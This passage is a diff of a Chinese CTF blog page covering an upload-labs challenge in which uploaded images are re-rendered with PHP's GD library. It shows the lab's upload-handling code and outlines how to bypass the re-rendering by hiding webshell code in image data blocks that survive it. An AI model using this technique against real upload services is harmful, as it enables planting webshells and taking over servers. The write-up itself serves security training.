R0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2011.05.23.png" style="zoom:50%;">
+
+<p>这关更6，直接重新渲染图片了，主要作用就是破坏其中的恶意代码，但是估计应该存在某些位置（可能是图片格式的参数字段等）没有被重新渲染。在这些位置存在插入恶意代码的可能。</p>
+<ul>
+<li>代码</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span>
+    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$tmpname</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token variable">$target_path</span><span class="token operator">=</span><span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 获得上传文件的扩展名</span>
+    <span class="token variable">$fileext</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">//判断文件后缀与类型，合法才进行上传操作</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$fileext</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string double-quoted-string">"image/jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpname</span><span class="token punctuation">,</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token comment">//使用上传的图片生成新的图片</span>
+            <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"该文件不是jpg格式的图片！"</span><span class="token punctuation">;</span>
+                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+                <span class="token comment">//给新图片指定文件名</span>
+                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$newfilename</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">;</span>
+                <span class="token comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>
+                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>
+                <span class="token function">imagejpeg</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传出错！"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$fileext</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string double-quoted-string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpname</span><span class="token punctuation">,</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token comment">//使用上传的图片生成新的图片</span>
+            <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"该文件不是png格式的图片！"</span><span class="token punctuation">;</span>
+                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+                 <span class="token comment">//给新图片指定文件名</span>
+                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$newfilename</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".png"</span><span class="token punctuation">;</span>
+                <span class="token comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>
+                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>
+                <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>               
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传出错！"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$fileext</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"gif"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string double-quoted-string">"image/gif"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpname</span><span class="token punctuation">,</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token comment">//使用上传的图片生成新的图片</span>
+            <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatefromgif</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"该文件不是gif格式的图片！"</span><span class="token punctuation">;</span>
+                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+                <span class="token comment">//给新图片指定文件名</span>
+                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$newfilename</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".gif"</span><span class="token punctuation">;</span>
+                <span class="token comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>
+                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>
+                <span class="token function">imagegif</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传出错！"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>if(($fileext == "jpg") &amp;&amp; ($filetype=="image/jpeg")){</code>从这行代码可以看出，后缀名和MIME类型必须都得满足条件才能进入后续逻辑。</p>
+<p>修改<code>content-type</code>和后缀名使得能进入后续逻辑：</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2011.15.42.png" style="zoom:50%;">
+
+<blockquote>
+<h4 id="imagecreatefromgif函数"><a href="#imagecreatefromgif函数" class="headerlink" title="imagecreatefromgif函数"></a>imagecreatefromgif函数</h4><p><code>imagecreatefromgif()</code> 是 PHP 中的一个函数，属于 GD 图像库，用于从 GIF 文件中创建一个新的图像资源。这个函数常用于图像处理和操作，比如裁剪、缩放、合并图像等。</p>
+<h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">resource <span class="token function">imagecreatefromgif</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li><strong>参数</strong>：<ul>
+<li><code>$filename</code>：GIF 文件的路径。</li>
+</ul>
+</li>
+<li><strong>返回值</strong>：<ul>
+<li>成功时返回一个图像资源，可用于后续的图像处理。</li>
+<li>如果文件无法加载或不是有效的 GIF 图像，返回 <code>false</code>。</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h2 id="16-4-绕过GD库的思路"><a href="#16-4-绕过GD库的思路" class="headerlink" title="16.4 绕过GD库的思路"></a>16.4 绕过GD库的思路</h2><p>将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。</p>
+<h2 id="16-5《文件上传漏洞之二次渲染绕过》"><a href="#16-5《文件上传漏洞之二次渲染绕过》" class="headerlink" title="16.5《文件上传漏洞之二次渲染绕过》"></a>16.5《文件上传漏洞之二次渲染绕过》</h2><p>后面的内容写在本站《文件上传漏洞之二次渲染绕过》一文。</p>
 
                 
             </div>
@@ -2224,7 +2637,7 @@ Content-Disposition: form-data<span class="token punctuation">;</span> <span cla
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">176k</span>
+                        class="white-color">183.8k</span>
             
             
             
